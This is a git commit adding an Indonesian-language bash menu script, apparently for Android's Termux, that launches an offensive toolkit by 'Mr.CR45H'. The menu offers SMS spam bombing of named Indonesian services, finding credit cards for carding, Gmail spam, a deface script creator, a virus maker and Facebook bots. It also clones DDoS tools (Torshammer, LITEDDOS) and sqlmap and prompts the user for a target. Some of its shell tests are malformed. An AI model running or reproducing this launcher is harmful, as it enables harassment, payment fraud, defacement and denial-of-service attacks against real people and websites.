e8ca7855d2cdc54cc33847bc436a5e0553b85e06
EUCT <57327818+EUCT@users.noreply.github.com>
2019-11-18 15:42:10 +0700

    Add files via upload

---
+++ CR45H.sh
@@ -0,0 +1,386 @@
+#!/system/xbin/bash
+clear
+cd module
+python2 please.py
+blue='\033[34;1m'
+green='\033[32;1m'  
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'                                           
+yellow='\033[33;1m'
+sleep 1
+echo $red
+cat asw.txt
+echo ""
+echo "\033[34;1m[$]\033[36;1m============================\033[34;1m[$]"
+echo "\033[32;1mAuthor : Mr.CR45H"
+echo "\033[37;1mFeat: Mr.ZhuSyren7"
+echo "\033[35;1mversion Tools: 1"
+echo "\033[35;1mTeam : Lolzecure "
+echo "\033[33;1mKontak Me :  085755365813"
+echo "\033[92mExploit Union Cyber Team" 
+echo "\033[36;1mLolzecure"
+echo "\033[34;1m[$]\033[36;1m============================\033[34;1m[$]"
+echo ""
+echo "\033[32;1mSilahkan Pilih Tools Yang mau Kamu pake:)?:"
+echo "\033[36;1m"
+echo "[===============================================[>"
+echo $green "1.> Spam Sms Tokopedia"
+echo "[===============================================]>"
+echo $purple "2.> Spam Sms Telkomnyet"
+echo "[===============================================]>"
+echo $cyan "3.> Spam Sms Matahari Mall"
+echo "[===============================================]>"
+echo $red "4.> Spam Sms HooqTV"
+echo "[===============================================]>"
+echo $white "5.> Spam Sms KFC"
+echo "[===============================================]>"
+echo $green "6.> Spam Sms PHD"
+echo "[===============================================]>"
+echo $purple "7.> Spam Sms Whiskas"
+echo "[===============================================]>"
+echo $cyan "8.> Spam Sms ZiPAY"
+echo "[===============================================]>"
+echo $red "9.> Nyari CC buat Carding"
+echo "[===============================================]>"
+echo $white "10.> Spam Akun Gmail"
+echo "[===============================================]>"
+echo $green "11.> Whois LookUp"
+echo "[===============================================]>"
+echo $purple "12.> Upload Admin Finder"
+echo "[===============================================]>"
+echo $cyan "13.> Script Deface Creator"
+echo "[===============================================]>"
+echo $red "14.> ReConDog Buat Information gathering"
+echo "[===============================================]>"
+echo $white "15.> Admin Login Finder"
+echo "[===============================================]>"
+echo $green "16.> Virus VbugMaker Creator"
+echo "[===============================================]>"
+echo $purple "17.> dowload script deface orang"
+echo "[===============================================]>"
+echo $cyan "18.> Autolike Facebook"
+echo "[===============================================]>"
+echo $red "19.> Facebook Auto_Reaction"
+echo "[===============================================]>"
+echo $white "20.> Bot Komentar Facebook"
+echo "[===============================================]>"
+echo $green "21.> Install txtool"
+echo "[===============================================]>"
+echo $purple "22.> install sqlscan"
+echo "[===============================================]>"
+echo $cyan "23.> install hash-buster"
+echo "[===============================================]>"
+echo $red "24.> Install Red_Hawk"
+echo "[===============================================]>"
+echo $white "25.> Install Torshammer buat DDOS website"
+echo "[===============================================]>"
+echo $green "26.> Install LITEDDOS buat DDOS website"
+echo "[===============================================]>"
+echo $purple "27.> Install Hunner Framework"
+echo "[===============================================]>"
+echo $cyan "28.> Install Sqlmap Buat Inject Situs"
+echo "[===============================================]>"
+echo $red "29.> Install 4wsectools"
+echo "[===============================================]>"
+echo $white "30.> Install Lazymux Buat Install Tools"
+echo "[===============================================]>"
+echo $yellow "0.> keluar"
+echo "[+]===============================================[+]"
+echo "\033[32;1m"
+read -p "root@T00Ls-CR45Hv1~#" bro
+
+if [ $bro = 1 ] || [ $bro = 1 ]
+then
+clear
+figlet "Mr.CR45H" | lolcat
+php tp.php
+fi
+
+if
+[ $bro = 2 ] || [ $bro = 2 ]
+then
+clear
+toilet "Mr.CR45H"
+php t.php
+fi
+
+if [ $bro = 3 ] || [ $bro = 3 ]
+then
+figlet "Mr.CR45H"
+php mataharimall.php
+fi
+
+if [ $bro = 4 ] || [ $bro = 4 ]
+then
+clear
+toilet "Mr.CR45H"
+php hooq.php
+fi
+
+if [ $bro = 5 ] || [ $bro = 5 ]
+then
+clear
+toilet -f slant --gay "Mr.CR45H"
+php kfc.php
+fi
+
+if [ $bro = 6 ] || [ $bro = 6 ]
+then
+clear
+toilet -f mono12 -F gay "Mr.CR45H"
+php phd.php
+fi
+
+if [ $bro = 7 ] || [ $bro = 7 ]
+then
+clear
+toilet "Mr.CR45H" 
+php whiskas.php
+fi
+
+if [ $bro = 8 ] || [ $bro = 8 ]
+then
+clear
+figlet "Mr.CR45H"
+php zipay.php
+fi
+
+if [ $bro = 9 ] || [ $bro = 9 ]
+then
+clear
+toilet "Mr.CR45H"
+php key.php
+fi
+
+if [ $bro = 10 ] || [ $bro = 10 ]
+then
+clear
+toilet "Mr.CR45H"
+python2 SpamMail.py
+fi
+
+if [ $bro = 11 ] || [ $bro = 11 ]
+then
+clear
+toilet "Mr.CR45H"
+python2 whs.py
+fi
+
+if [ $bro = 12 ] || [ $bro = 12 ]
+then
+clear
+toilet "Mr.CR45H"
+python2 upf.py
+fi
+
+if [ $bro = 13 ] || [ $bro = 13 ]
+then
+clear
+toilet "Mr.CR45H"
+python2 create.py
+fi
+
+if [ $bro = 14 ] || [ $bro = 14 ]
+then
+clear
+toilet "Mr.CR45H"
+python2 dog.py
+fi
+
+if [ $bro = 15 ] || [ $bro = 15 ]
+then
+clear
+toilet "Mr.CR45H"
+python2 gam.py
+fi
+
+if [ $bro = 16 ] || [ $bro = 16 ]
+then
+clear
+toilet "Mr.CR45H"
+python2 anvima.py
+fi
+
+if [ $bro = 17 ] || [ $bro = 17 ]
+then
+clear
+toilet "Mr.CR45H"
+python2 htmd.py
+fi
+
+if [ $bro = 18 ] || [ $bro = 18 ]
+then
+clear
+toilet "Mr.CR45H"
+php autolike.php
+fi
+
+if [ $bro = 19 ] || [ $bro = 19 ]
+then
+clear
+toilet "Mr.CR45H"
+python2 auto_reaction.py
+fi
+
+if [ $bro = 20 ] || [ bro = 20 ]
+then
+clear
+figlet "Mr.CR45H" | lolcat
+python2 botkomen.py
+fi
+
+if [ $bro = 21 ] || [ $bro = 21 ]
+then
+clear
+figlet "Mr.CR45H" | lolcat
+git clone https://github.com/kuburan/txtool
+mv txtool $HOME
+cd $HOME/txtool
+python2 install.py
+python2 update.py
+txtool
+fi
+
+
+if [ $bro = 22 ] || [ bro = 22 ]
+then
+clear
+toilet -f slant -F gay "Mr.CR45H" 
+pkg install update && pkg install upgrade
+pkg install git
+pkg install php
+cd module
+php sqlscan.php
+fi
+
+if [ $bro = 23 ] || [ $bro = 23 ]
+then
+clear
+toilet -f mono12 -F gay "Mr.CR45H" 
+apt upgrade
+apt install python2
+apt install git
+git clone https://github.com/UltimateHackers/Hash-Buster
+mv Hash-Buster $HOME
+cd $HOME/Hash-Buster
+python2 hash.py
+fi
+
+if [ $bro = 24 ] || [ $bro = 24 ]
+then
+clear
+toilet -f standard -F gay "Mr.CR45H" 
+echo "\033[33;1muntuk tutorial kunjungi:" "\033[36;1m https://youtu.be/h2I5HU3W-so"
+sleep 3
+apt update
+apt install git
+apt install php
+git clone https://github.com/Tuhinshubhra/RED_HAWK
+mv RED_HAWK $HOME
+cd $HOME/RED_HAWK
+chmod +x rhawk.php
+php rhawk.php
+fi
+
+if [ $bro = 25 ] || [ $bro = 25 ]
+then
+clear
+toilet -f standard -F gay "Mr.CR45H" 
+apt update
+apt install git
+apt install tor
+git clone https://github.com/dotfighter/torshammer.git
+mv torshammer $HOME
+cd $HOME/torshammer
+read -p "Masukan Target==>:" target
+python2 torshammer.py -T -t target
+fi
+
+if [ $bro = 26 ] || [ $bro = 26 ]
+then
+clear
+toilet -f standard -F gay "Mr.CR45H" 
+echo "\033[33;1muntuk tutorial kunjungi:" "\033[36;1m https://youtu.be/EskgepQSB7U"
+sleep 3
+apt update
+apt install git
+git clone https://github.com/4L13199/LITEDDOS
+mv LITEDDOS $HOME
+cd $HOME/LITEDDOS
+read -p "MasukanTarget:" target
+python2 LITEDDOS.py target 80 100
+fi
+
+if [ $bro = 27  || [ $bro = 27 ]
+then
+clear
+toilet -f standard -F gay "Mr.CR45H" 
+apt update
+apt install git
+git clone https://github.com/b3-v3r/Hunner.git
+mv Hunner $HOME
+cd $HOME/Hunner
+chmod +x hunner.py
+python2 hunner.py
+fi
+
+if [ $bro = 28 ] || [ $bro = 28 ]
+then
+clear
+toilet -f standard -F gay "Mr.CR45H"
+apt update
+apt install git
+git clone https://github.com/sqlmapproject/sqlmap
+mv sqlmap $HOME
+cd $HOME/sqlmap
+read -p "masukan web target:" target
+python2 sqlmap.py -D target
+fi
+
+if [ $bro = 29 ] || [ $bro = 29 ]
+then
+clear
+toilet -f standard -F gay "Mr.CR45H" 
+apt update
+apt install git
+git clone https://github.com/aryanrtm/4wsectools
+mv 4wsectools $HOME
+cd $HOME/4wsectools
+chmod 777 tools
+./tools
+fi
+
+if [ $bro = 30 ] || [ $bro = 30 ]
+then
+clear
+figlet "Mr. CR45H" | lolcat
+apt update && upgrade
+apt install python2 
+apt install git
+cd module
+python2 lazymux.py
+fi
+
+if [ $bro = 0 ] || [ $bro = 00 ]
+then
+echo "\033[32;1mLolzecure"
+sleep 1
+echo "\033[33;1mWe Security"
+sleep 1
+echo " We Not Friends"
+sleep 1
+echo "We Are Family"
+sleep 1
+echo "Hacking Is Not Criminal;)"
+sleep 1
+echo "Ketika Sebuah Hayalan Tidak tercapai"
+sleep 1
+echo "Maka Terus lah BerJuang Dan Berusaha:)"
+sleep 1
+echo "\033[32;1mKarna Suatu Hari Nanti Kamu akan Mendapatkannya:)"
+sleep 1
+exit
+fi
+
